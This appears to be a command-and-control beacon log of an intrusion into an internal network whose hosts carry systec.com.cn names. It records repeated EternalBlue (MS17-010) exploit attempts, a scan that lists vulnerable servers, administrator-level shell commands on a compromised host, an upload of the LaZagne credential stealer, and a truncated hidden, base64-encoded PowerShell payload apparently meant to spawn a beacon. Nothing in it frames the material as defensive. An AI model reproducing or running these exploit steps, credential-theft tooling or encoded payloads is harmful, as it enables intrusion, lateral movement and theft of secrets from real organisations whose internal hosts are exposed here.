+ERROR: 所在位置 行:628 字符: 25
+ERROR: +              $gsock.Send <<<< ($payload_hdr_pkt) | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Send:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+
+
+12/21 18:35:03 UTC [output]
+received output:
+VERBOSE: socket error, exploit may fail 
+
+
+12/21 18:35:07 UTC [output]
+received output:
+ERROR: New-Object : 使用“2”个参数调用“.ctor”时发生异常:“由于目标计算机积极拒绝，无法连接。 192.168.20.215:445”
+ERROR: 所在位置 行:624 字符: 33
+ERROR: +             $client = New-Object <<<<  System.Net.Sockets.TcpClient($Target,445)
+ERROR:     + CategoryInfo          : InvalidOperation: (:) [New-Object], MethodInvocationException
+ERROR:     + FullyQualifiedErrorId : ConstructorInvokedThrowException,Microsoft.PowerShell.Commands.NewOb 
+ERROR:    jectCommand
+ERROR:  
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:628 字符: 25
+ERROR: +              $gsock.Send <<<< ($payload_hdr_pkt) | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Send:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+ERROR: New-Object : 使用“2”个参数调用“.ctor”时发生异常:“由于目标计算机积极拒绝，无法连接。 192.168.20.215:445”
+ERROR: 所在位置 行:624 字符: 33
+ERROR: +             $client = New-Object <<<<  System.Net.Sockets.TcpClient($Target,445)
+ERROR:     + CategoryInfo          : InvalidOperation: (:) [New-Object], MethodInvocationException
+ERROR:     + FullyQualifiedErrorId : ConstructorInvokedThrowException,Microsoft.PowerShell.Commands.NewOb 
+ERROR:    jectCommand
+ERROR:  
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:628 字符: 25
+ERROR: +              $gsock.Send <<<< ($payload_hdr_pkt) | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Send:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+
+
+12/21 18:35:07 UTC [output]
+received output:
+VERBOSE: socket error, exploit may fail 
+VERBOSE: Running final exploit packet
+VERBOSE: socket error, exploit may fail 
+VERBOSE: SMB code: 00-00
+VERBOSE: Send the payload with the grooms
+
+
+12/21 18:35:08 UTC [output]
+received output:
+VERBOSE: socket error, exploit may fail 
+ERROR: 使用“1”个参数调用“Send”时发生异常:“远程主机强迫关闭了一个现有的连接。”
+ERROR: 所在位置 行:614 字符: 15
+ERROR: +     $sock.Send <<<< ($pkt) | out-null
+ERROR:     + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+ERROR:     + FullyQualifiedErrorId : DotNetMethodException
+ERROR:  
+VERBOSE: socket error, exploit may fail 
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:663 字符: 21
+ERROR: +      $fhs_sock.Close <<<< () | Out-Null
+ERROR:     + CategoryInfo          : InvalidOperation: (Close:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+VERBOSE: Running final exploit packet
+VERBOSE: socket error, exploit may fail horribly
+VERBOSE: Send the payload with the grooms
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:688 字符: 20
+ERROR: +         $gsock.Send <<<< ($payload_body_pkt[0..2919]) | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Send:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:688 字符: 20
+ERROR: +         $gsock.Send <<<< ($payload_body_pkt[0..2919]) | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Send:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:688 字符: 20
+ERROR: +         $gsock.Send <<<< ($payload_body_pkt[0..2919]) | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Send:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:688 字符: 20
+ERROR: +         $gsock.Send <<<< ($payload_body_pkt[0..2919]) | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Send:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:688 字符: 20
+ERROR: +         $gsock.Send <<<< ($payload_body_pkt[0..2919]) | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Send:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:688 字符: 20
+ERROR: +         $gsock.Send <<<< ($payload_body_pkt[0..2919]) | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Send:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:688 字符: 20
+ERROR: +         $gsock.Send <<<< ($payload_body_pkt[0..2919]) | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Send:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+
+
+12/21 18:35:08 UTC [output]
+received output:
+VERBOSE: Connecting to target for activities
+VERBOSE: Connection established for exploitation.
+VERBOSE: all but last fragment of exploit packet
+
+
+12/21 18:35:09 UTC [output]
+received output:
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:692 字符: 20
+ERROR: +         $gsock.Send <<<< ($payload_body_pkt[2920..4072]) | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Send:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:692 字符: 20
+ERROR: +         $gsock.Send <<<< ($payload_body_pkt[2920..4072]) | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Send:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:692 字符: 20
+ERROR: +         $gsock.Send <<<< ($payload_body_pkt[2920..4072]) | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Send:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+
+
+12/21 18:35:10 UTC [output]
+received output:
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:692 字符: 20
+ERROR: +         $gsock.Send <<<< ($payload_body_pkt[2920..4072]) | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Send:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:692 字符: 20
+ERROR: +         $gsock.Send <<<< ($payload_body_pkt[2920..4072]) | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Send:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:692 字符: 20
+ERROR: +         $gsock.Send <<<< ($payload_body_pkt[2920..4072]) | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Send:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:692 字符: 20
+ERROR: +         $gsock.Send <<<< ($payload_body_pkt[2920..4072]) | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Send:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+
+
+12/21 18:35:11 UTC [output]
+received output:
+VERBOSE: socket error, exploit may fail 
+VERBOSE: socket error, exploit may fail 
+
+
+12/21 18:35:12 UTC [output]
+received output:
+VERBOSE: Running final exploit packet
+VERBOSE: socket error, exploit may fail 
+VERBOSE: SMB code: 00-00
+VERBOSE: Send the payload with the grooms
+
+
+12/21 18:35:13 UTC [output]
+received output:
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:696 字符: 21
+ERROR: +         $gsock.Close <<<< () | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Close:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:696 字符: 21
+ERROR: +         $gsock.Close <<<< () | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Close:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:696 字符: 21
+ERROR: +         $gsock.Close <<<< () | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Close:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:696 字符: 21
+ERROR: +         $gsock.Close <<<< () | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Close:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:696 字符: 21
+ERROR: +         $gsock.Close <<<< () | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Close:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:696 字符: 21
+ERROR: +         $gsock.Close <<<< () | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Close:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:696 字符: 21
+ERROR: +         $gsock.Close <<<< () | out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Close:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+ERROR: 不能对值为空的表达式调用方法。
+ERROR: 所在位置 行:699 字符: 17
+ERROR: +      $sock.Close <<<< ()| out-null
+ERROR:     + CategoryInfo          : InvalidOperation: (Close:String) [], RuntimeException
+ERROR:     + FullyQualifiedErrorId : InvokeMethodOnNull
+ERROR:  
+VERBOSE: Connecting to target for activities
+VERBOSE: Connection established for exploitation.
+VERBOSE: all but last fragment of exploit packet
+VERBOSE: Running final exploit packet
+VERBOSE: SMB code: 00-00
+VERBOSE: Send the payload with the grooms
+
+
+12/21 18:35:18 UTC [output]
+received output:
+VERBOSE: Connecting to target for activities
+VERBOSE: Connection established for exploitation.
+VERBOSE: all but last fragment of exploit packet
+
+
+12/21 18:35:19 UTC [output]
+received output:
+VERBOSE: Connecting to target for activities
+VERBOSE: Connection established for exploitation.
+VERBOSE: all but last fragment of exploit packet
+
+
+12/21 18:35:20 UTC [output]
+received output:
+VERBOSE: socket error, exploit may fail 
+
+
+12/21 18:35:20 UTC [output]
+received output:
+VERBOSE: Running final exploit packet
+VERBOSE: SMB code: 00-00
+VERBOSE: Send the payload with the grooms
+
+
+12/21 18:35:21 UTC [output]
+received output:
+VERBOSE: socket error, exploit may fail 
+VERBOSE: Running final exploit packet
+VERBOSE: socket error, exploit may fail 
+VERBOSE: SMB code: 00-00
+VERBOSE: Send the payload with the grooms
+
+
+12/21 18:35:26 UTC [output]
+received output:
+VERBOSE: Connecting to target for activities
+VERBOSE: Connection established for exploitation.
+VERBOSE: all but last fragment of exploit packet
+VERBOSE: Running final exploit packet
+
+
+12/21 18:35:27 UTC [checkin] host called home, sent: 12 bytes
+12/21 18:35:27 UTC [output]
+-------------------------------------------------------------MS17010探测------------------------------------------------------------
+
+12/21 18:35:28 UTC [output]
+received output:
+VERBOSE: Connecting to target for activities
+VERBOSE: Connection established for exploitation.
+VERBOSE: all but last fragment of exploit packet
+
+
+12/21 18:35:29 UTC [output]
+received output:
+VERBOSE: socket error, exploit may fail 
+VERBOSE: SMB code: 00-00
+VERBOSE: Send the payload with the grooms
+
+
+12/21 18:35:30 UTC [output]
+received output:
+VERBOSE: socket error, exploit may fail 
+
+
+12/21 18:35:31 UTC [output]
+received output:
+VERBOSE: socket error, exploit may fail 
+VERBOSE: Running final exploit packet
+VERBOSE: socket error, exploit may fail 
+VERBOSE: SMB code: 00-00
+VERBOSE: Send the payload with the grooms
+
+
+12/21 18:35:32 UTC [task] <T1093> Tasked beacon to run .NET program: Ladon.exe 192.168.20.0/24 MS17010
+12/21 18:35:32 UTC [checkin] host called home, sent: 989273 bytes
+12/21 18:35:36 UTC [output]
+received output:
+Ladon 6.6
+Start: 2023/12/22 2:35:21
+Runtime: .net 4.0  OS Arch: x64
+OS Name: Microsoft Windows Server 2008 R2 Enterprise 
+192.168.20.0/24
+load MS17010
+192.168.20.0/24 is Valid CIDR
+IPCound: 256
+Scan Start: 2023/12/22 2:35:21
+
+
+12/21 18:35:36 UTC [output]
+received output:
+192.168.20.11 WIN-PSLI8L6MUE4  [Win 2012 R2 Datacenter 9600]
+192.168.20.4 CITRIXDDC systec.com.cn [Win 2008 R2 Enterprise 7601 SP 1]
+192.168.20.28 MS17-010 ADSSP  [Win 2008 R2 Enterprise 7601 SP 1]
+192.168.20.25 MS17-010 NINGTON  [Win 2016 Essentials 14393]
+192.168.20.100 WIN-G5Q83ETG78N
+
+
+12/21 18:35:39 UTC [output]
+received output:
+192.168.20.37 testioa.systec.com.cn
+192.168.20.33 rpa9.systec.com.cn
+192.168.20.36 ioa.systec.com.cn
+
+
+12/21 18:36:12 UTC [output]
+received output:
+192.168.20.8 bi.systec.com.cn
+192.168.20.31 qiyemis.systec.com.cn
+192.168.20.26 token.systec.com.cn
+192.168.20.43 atrust.systec.com.cn
+
+
+12/21 18:36:17 UTC [output]
+received output:
+192.168.20.111 OASYSTEM  [Win 2008 R2 Enterprise 7601 SP 1]
+192.168.20.197 RPA2012  [Win 2012 R2 Datacenter 9600]
+
+
+12/21 18:36:18 UTC [output]
+received output:
+192.168.20.198 rpa4.systec.com.cn
+
+
+12/21 18:36:52 UTC [output]
+received output:
+192.168.20.110 OASQL-TEST
+
+
+12/21 18:37:00 UTC [output]
+received output:
+=============================================
+OnlinePC:33
+Cidr Scan Finished!
+End: 2023/12/22 2:36:42
+
+
+12/21 18:51:02 UTC [input] <niko> shell whoami
+12/21 18:51:13 UTC [task] <T1059> Tasked beacon to run: whoami
+12/21 18:51:51 UTC [checkin] host called home, sent: 37 bytes
+12/21 18:52:55 UTC [output]
+received output:
+oasystem\administrator
+
+
+12/21 18:53:01 UTC [input] <niko> shell whoami
+12/21 18:53:13 UTC [task] <T1059> Tasked beacon to run: whoami
+12/21 18:54:22 UTC [checkin] host called home, sent: 37 bytes
+12/21 18:54:39 UTC [input] <niko> shell whoami
+12/21 18:54:39 UTC [output]
+received output:
+oasystem\administrator
+
+
+12/21 18:54:39 UTC [task] <T1059> Tasked beacon to run: whoami
+12/21 18:54:45 UTC [checkin] host called home, sent: 37 bytes
+12/21 18:54:48 UTC [output]
+received output:
+oasystem\administrator
+
+
+12/21 18:58:48 UTC [input] <niko> shell whoami
+12/21 18:58:48 UTC [task] <T1059> Tasked beacon to run: whoami
+12/21 18:58:48 UTC [checkin] host called home, sent: 37 bytes
+12/21 18:58:48 UTC [output]
+received output:
+oasystem\administrator
+
+
+12/21 19:03:57 UTC [input] <niko> shell whoami
+12/21 19:04:06 UTC [task] <T1059> Tasked beacon to run: whoami
+12/21 19:05:30 UTC [checkin] host called home, sent: 37 bytes
+12/21 19:06:03 UTC [output]
+received output:
+oasystem\administrator
+
+
+12/21 19:23:10 UTC [input] <niko> shell whoami
+12/21 19:23:10 UTC [task] <T1059> Tasked beacon to run: whoami
+12/21 19:23:10 UTC [input] <niko> shell ipconfig
+12/21 19:23:10 UTC [task] <T1059> Tasked beacon to run: ipconfig
+12/21 19:23:10 UTC [input] <niko> upload C:\Users\Altria\Desktop\lazagne.exe (E:\lazagne.exe)
+12/21 19:23:10 UTC [task] <> Tasked beacon to upload C:\Users\Altria\Desktop\lazagne.exe as E:\lazagne.exe
+12/21 19:23:10 UTC [indicator] file: 6c3f994a8760e9c76fbaedbb302ff398 5621525 bytes E:\lazagne.exe
+12/21 19:23:10 UTC [checkin] host called home, sent: 1046656 bytes
+12/21 19:23:15 UTC [output]
+received output:
+oasystem\administrator
+
+
+12/21 19:23:15 UTC [output]
+received output:
+
+Windows IP 配置
+
+
+以太网适配器 本地连接 2:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开
+   连接特定的 DNS 后缀 . . . . . . . : 
+
+以太网适配器 本地连接:
+
+   连接特定的 DNS 后缀 . . . . . . . : 
+   IPv4 地址 . . . . . . . . . . . . : 192.168.20.111
+   子网掩码  . . . . . . . . . . . . : 255.255.255.0
+   默认网关. . . . . . . . . . . . . : 192.168.20.254
+
+隧道适配器 isatap.{DCFC779C-0D98-470C-BCED-2F2E0032A825}:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开
+   连接特定的 DNS 后缀 . . . . . . . : 
+
+隧道适配器 本地连接* 4:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开
+   连接特定的 DNS 后缀 . . . . . . . : 
+
+隧道适配器 isatap.{BF256D03-26A6-4F38-BB54-E1EE8BAF42D8}:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开
+   连接特定的 DNS 后缀 . . . . . . . : 
+
+
+12/21 19:23:15 UTC [checkin] host called home, sent: 1040488 bytes
+12/21 19:23:19 UTC [checkin] host called home, sent: 1040488 bytes
+12/21 19:23:26 UTC [checkin] host called home, sent: 1040488 bytes
+12/21 19:23:32 UTC [checkin] host called home, sent: 1040488 bytes
+12/21 19:23:41 UTC [checkin] host called home, sent: 413553 bytes
+12/21 19:32:30 UTC [input] <niko> shell whoami
+12/21 19:32:38 UTC [task] <T1059> Tasked beacon to run: whoami
+12/21 19:32:53 UTC [input] <niko> sleep 0
+12/21 19:33:00 UTC [checkin] host called home, sent: 37 bytes
+12/21 19:33:04 UTC [task] <T1029> Tasked beacon to become interactive
+12/21 19:33:20 UTC [output]
+received output:
+oasystem\administrator
+
+
+12/21 19:33:46 UTC [input] <niko> sleep 0
+12/21 19:33:51 UTC [checkin] host called home, sent: 16 bytes
+12/21 19:33:54 UTC [task] <T1029> Tasked beacon to become interactive
+12/21 19:34:13 UTC [checkin] host called home, sent: 16 bytes
+12/21 19:40:08 UTC [input] <s09> shell powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAWABhAFcALwBpAFMAaABiADkAbgBQAHcASwBmADQAZwBFAHEAQQBrAHkAUwAwAGoAeQBSAGkAMAA5ADQANABVAFkAcwBBAE0AMgBOAGsAdABlAEYAQgBtADcAZwBNAEwAbABoAGIASQBOAGgAagBmADkAMwArAGUAVwBnAFgAUgA2AE8AagAzAFQAMABrAHcAawBWAEkAdgB2AGMAdQByAFUAdgBiAGQAdQBUAEoAVABlAG0AaQBuAEYAYgBxAHAARgBIAHUASgB1AGIAVQBRAFQASABJAFYAYwA0AC8AcAA2AG0AWQBWAHUAeQB1AFoAcwA4AHIAWgBDADYAVgB0AE0ASQAvAGYATgA4AFQAeQBLAGsAbwBUADcAKwAvAHAAcQA2AEYAQQBuADQATQBvADMATwA0AGUAKwBCAFoARwBYAEUAVgBUAGwAaQBnAFUAVABSAEYANQBHAFUAZQBYAHEANgB2AHEAcQAyAE0AcgBDAHgARgBtAGkAdAA5AEIASgA4AFEANgA5AEIAUwBoAGQAUgAxADcAQwBmAGUAWABLAEwAMABJAGMAUwAxAEgAZwA0AFAARAAxAGoAegAvAEUAagBGAEkAVQBwAHEAZAAxAHIAWQB0AFMASQBVAGwAUQBzAEMAQQBZAEoAZQBVAEsAOQAwADkAdQBzAGsAWQBVADMAVAA0AHYATgBzAGgATgB1AGIAKwA1AG0ANwBkAGEAbAAwAFEATABoADUAegBGAEQAcQBMAGoAcgB1AEUAVQBRAHUAaQB4AGIANABQAEkAZABkAGcASgBhAG0AWgBNAGMARgBvAHUALwBmAFYAWABxAGYASgB5AFcAMwArAHQAeQBkAHYATQBJAFUAbQA1AFoAQgA2AFMARgBBAFUAMQBqADUAQgBTAGgAZgB0AFcAWQBRADcASABoAHgAaQBWAFMAeABwADIAYQBaAFIARQB5ADcAUQAyAHcAVwBHAHoAVQBiAE0ASwA5AEgAbwBCAFgAagB0AGgATAAxAFgATwBKADEAdgBGAEQAcAB6AGoAMQA0AGQAawBWAGsAOAA2ADUAUgBKAE0AaAA4AEMATgBjAE8ASwB3AFYATwBWAGUAbQBMACsAWAAxADEAZgB1AHoAMwBjADAAUgBoAGEAbQBPAEUAQQAxAE4AVQB3AFIAagBXAEkAVAAwAFIAMQAyAFUAVgBKADcAYwBrAEsAUABJAEEATQB0AFEAYQAyAFUAdwBKADIARgBxADEASQBGAFEARgBDAFUAWgBqAFQAawBMAGwAaABBAGIAeABmADUAcQBIAHcAVABaAG8AUgBVAHcAZQA3AEwANwA5AHAAOQBMAGUAdABvAGYAeQBIADMAZAA1AFgASwBIADUAVgBBAGEAcABqAFMAUwB2AFUAYwBFADcAOQBEAGgAMQBiAEUAegBjAGsAYwBIAE8AYwBuADkAQgArAEMAcQB3AEoALwBQAHcAVgBZADUAZgByAGIAWgA2AEgAcQBJAFkASgBXAFQAbwByAGUAVQB1AEQAMwBRADYAeABlAFgAMQAyADkARgBGAE0ARQA1AHkAawBQAG8AdwBRAFgAZQBsADgANQB2AHMAcABwAEEATQBKAEoASQAzAHAAZwAxAHoAbQBtAEcAYQBxADgAZgByACsAZgBrADkAdQBMAFoAbABMADkAcABhAEgANgBSAGUAdQBzAGMANwBxAGUARQA0ADYAdgAzAEkAcwBkAFkAZQAvADEAKwBxAHAAeQBmAFkANABlAHQAdgArADIAeQBEAEQAeABFAEcAWABmAGYANQAwAE4ARQBsAHIAaQBFAEUAbQBIADAAQQBtAHcAZQB3AG4ANAA4AG0AZAAzAGgAcABZAEUARgBYAHoAVQBMAG0ASQA2ADQAQwB5AFgAegBoACsAUQBKADUAMwBaAEsAVABGAEMAWAAzADUAVwBrAHcATwBjAHYAdQB0ADIAVAB1AEEARQBGACsANAA5AEEAVgBRAFEARQBwAFUAZgB3AFoAegB1AHMARgB4AFMAUQB3ADAARgB3AE4AOQBwAEQAVwBGADYAcwA0AFEAMABRAHgAZgBwAGMAMgBvAGQATAB0ADcAWgBtAHMAVwB5AFMASgB3AGsAcQBYAEwARABEAFAATABjAHIAWABJAG0AYwBnAGoAeQBxAHAAdwBRAEoAdgBqADgAUwBjAGoAUwBxAEoAaQBXAHYAcwBQAFYATQBwAEoAaQAxADAAbgBTAGkANwBuAFgAeQBpAGUAVQBuAGwAMgBMAFUAUQBnAFoAawA3AGwAdwB1ADAARABEADIASQB5AFIAaQB4ADMAQwBXAEsAbAB5AFQAOQBoAEQAbgBZAE8ASgBWAHgAYwBJAHAAVQA4ADUARQBSADEAQwBJAE8AWABBADAAZwA3AHUAQgBIAFkAWQBGADIAYgBLAFkAbwBaADYAMQBYACsAUABqADAAcgBOAFIASwBrAGEAeABBAFEARgBJAEYAMQBVAEkAWQBVADQASwA2AGcANQA1ADQAdwBxAHcAcwAxAFoASQBhAC8AMABIADIAQgBmADgAdQBTAFUARgBJAHkAcgBDADAAawBmAFEARQBNAEEAbQBDAFIASwBxADUAeQBOAGEAUQBwADEAcgBWAFQAOQBLAGYARAArAE4AMwBnAC8AbABwAGcAZgBZAEkAbwBVAG4AUwArAHkAWABDAFMAaQB1AG8AUwBDAGYAcQBvAEMAdwBFADYAQwBqADEAQwBNADAAWgBaADcAcQBMAEEAVQBmAE8AawBjAFUAcABaAEwAaABSAG0AWABQAFQAZABmADMANABrAHUAYQBLAFUAcABLAEMAawAwAEMAagBwAE8AZwB0AG8AdABzADYAaAB4ADUAVgBLAHoAawBhADMAeQB4ACsARwBnAGYAZABBADIAYQBxAE4AMwBtAEkAVgA2ADcAbwBZADIAbABYAGQASwAxADIAbQB2ADgAMQBFAGoAaQA5AHgAeABTAHIAZABQAHMAZwBSAHIAdwAyADAAawBDAGUAbQBTAGUATABFAGUAYgBKADEAOABzAE4AbgBrAGoAKwBMADAASQBBACsARgB4AGcAQwAzADgAUgAxAFcAcwAwAEgAbgBHAEMAcgBZAEQAVQBCAHYAOQBCAHoATgBqAEUAZQBxADcAbgBRAGwASQBzAGwAOQBYADEAUQBtAGwAbwBNADMAMgA4AEoAWABGAHIAVABxAG4AdQB3AGMAQgBrAGUAMwB2AGEAYgBQAEQAUgBUAE4AOQB2AHAAVwAzAFEAMABGAGIANwBKAHoAMgAwAEUALwBVAHQAbwBwADYATgBxAFoAbgBNAFYAVQB6AHAANgBIAHMAMgB5AHcASABRAFEAcQBiAHEAMQAzAGsAcAAzADIAZABtAHIAMwA0AGEAbgBmAG0ARABrAFAAWgBIAEcAUABDAG4AMQB2AHkAMwB6AE4AdABxAHUAZAB3ADkAYgBIAFIANwBiAEcAVwB4AEYAUgA1AG0AYwBHADcASwBOAG0AdgBZADAAbQB2AGYAdABaAEcARwBNADAAeQBWAGIASAB2AFkANQBkADcAeQBpAGgAUgBnAC8AMgBzADAAaAB6ADQANgBTAHAASAA5ADIAbAA3ADIAKwBjAHUARwA2AFoAZgByADAALwB0AHUAWgBUADQASwBiAHUAYgBLAG0AeQBhAEYATgB6AEYAcABPAGQATABWAGgAKwBjAHoAaQBuAEIAYgBhAGQAQQBoAGgAMQBoAGgATwA3AGoAZAA1AHgARgB2AHQAegB6ADkANwBLAHoAZQBHAGkAbgA0AGgAdwAxAGkAYQBoADIANgB5AEgAZwA3AHMAVgBWAGcAOQBuAHUAYQBCADMATQBNADAATwBqAFAAMgA1ADEAOQA4ACsAMwBIAG4ASAB4AGsARwBKAFcAMAA2AGIAWQB1AEEAMQBCADEALwAzAGoARwBQAFgAUwBqAFkAeQBlAGcANwBkAHEAWQBJAEQAZAA5ADIAUQBqAEkAMwA3AEcARwBUAGIATwA4AEQAZQBlAHQASgA3AC8AVwBsAE8AdAAyAGwALwBQAG0AUgArAGUASAA5AGoAdAByAFUAUgArAE4AaAB1AEUAeAAxAEQAOQBkAGoAQQBIAEEAZgAyAG4ATwB5AGMAYQBhAEgASAB3ACsALwBMAGgAUABxAHQAeAA2AFAAYgAxAEgATwBHAEoAWABjAG4ALwBiAG0ARQByAGYAdQBKAGYAbQB6AEUAbQBaAGIARQB0AE0AVgB3ADAAdQBiAHoAUABvAG4AYgBEAHoAQQBmAHEAcgA1AEcAbgAxAFMAcwBiAFEANwB0AEoAOQBEAGIAYQA2AGIAZABtAHgAaABFAGMAYQBTADEAbwBNAHMAQwBiADAAaAAyAFoAMgBqADYATABYADMAcwB4ADcAcABrAGsAWgBIADYAaABkAGcAdABxAHoAbgBKADYAcgBQAEcAUQBaAHUASABOAE4ALwBGAG0AcwBmAHoAcgBUAHQAcAB0AFIAdgBFAGgANQBZAG8ARwA1AGwAegBuADYAaQB4ADAANwBNADEAdAArADYAdQBCAFIAcgAyAC8AVABSAGUAdAB3AEkAegBIADMAdQBTADYARABSAFYAWABsAGEAQgBkADIARQBrAHoAOABkADIANwBrAHMAMgBQADEALwBZACsAMwB4AGcAOAAzAGQARABpAGUAKwBOAEwAZgA2AHgAUAA1AEoANwBVADkAUABQAGQAVQBsAEoAaQAzADEAUgBTAFoALwBIACsAMABmAFIAcQB1AHUAQQBwAHkAUABhAGYASwB5AE4AUgAvAGwAaQA3AEQALwBNAHIASABWAHIATABCAG4AUgBVAEIAegB0AGUAMQAxAEYAUgBmAEsAZQBYAHcAdwB3AHcAUwBPADUAMAA3AFgAcQA3AHYATwBDADcAKwBtAEcATQBoAGMATgBlAFQAWQBYACsATABrAHUAaABmAE8AOQBCAE8ATgBaAGQAZwBLAHkAdQBlAEgAYgBYAGMAdQBhAEcAOQAyAFIAUAByAEQAcgAzAHIAZwA3ADIAbQBzAGoATwBYADgAeQBWAHYAVwBlAFIAZQBaAGQAeQA0ADUAMABXAEQAOQBMAFkAaQB1AGUAKwBSADMAQgBJAFAAcABVAEMAdQBaAHMANwB3AGwAaQBTAFEAWQA5AGUAVwBMAEYAWQAyAG0AdgBQADQARwB0ADQAWQBoADQAWABiAEQAYgBzAE8AUwA1AEkAUQBVADkAMgBmAEQAcgBVADUARABKAHgAZwByAHAAagAvAGwASABVAGUAcgBNAGQASABtAHYARABUAHcANQAxAGcAMAArAHQAeQB4AEIAVAB6ADIAZwBYADEANwB4ADQANgA2AGcAOAA2AGIAUABqADIAUgBqAEoAVQAzAHkAeABCAFoAWABPAG0AYgBuAE4AawBLAEEATgAxAG4AMwA3AGYAMQArAEkAbgBkAFUAWABUAFkAcwBTAFcAeQBzAHEAZABlADQAMgA0AEYAZgA0AEcAWABkAEYAU